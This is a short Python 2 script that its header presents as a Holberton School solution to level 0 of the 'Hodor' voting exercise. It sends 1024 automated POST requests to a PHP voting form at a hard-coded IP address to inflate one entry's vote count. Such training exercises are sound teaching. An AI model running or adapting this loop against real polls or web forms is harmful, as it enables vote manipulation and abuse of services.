"""
 *
 * ===---Description------------------------------------------------------------===
 *  Solution for the Hodor Project, Level 0 by Julien Barbier.
 *  Using Python script(httplib and urllib).
 *
 *  by Alexandro de Oliveira, for Holberton School
 * ===--------------------------------------------------------------------------===
 *
"""
from httplib import HTTPConnection
from urllib import urlencode

num_votes = 1 << 10 # Which means 1024 votes(bitwise operation " 1 << 10").
params = urlencode({
    'id': '1',
    'holdthedoor': 'submit',
    })

headers = {
    "Content-type": "application/x-www-form-urlencoded",
    "User-Agent": "Python Post Requests - Alexandro de Oliveira"
    }

votes = 0
conn = HTTPConnection("173.246.108.142")
for x in range(0, num_votes):
    conn.request("POST", "/level0.php", params, headers)
    response = conn.getresponse()

    if response.reason == "OK":
        votes += 1
        print "Vote number: %d" % votes
    else:
        print "Connection error... (vote not computed)"
    #response.status, response.reason
    #data = response.read()
    #print data
    conn.close()
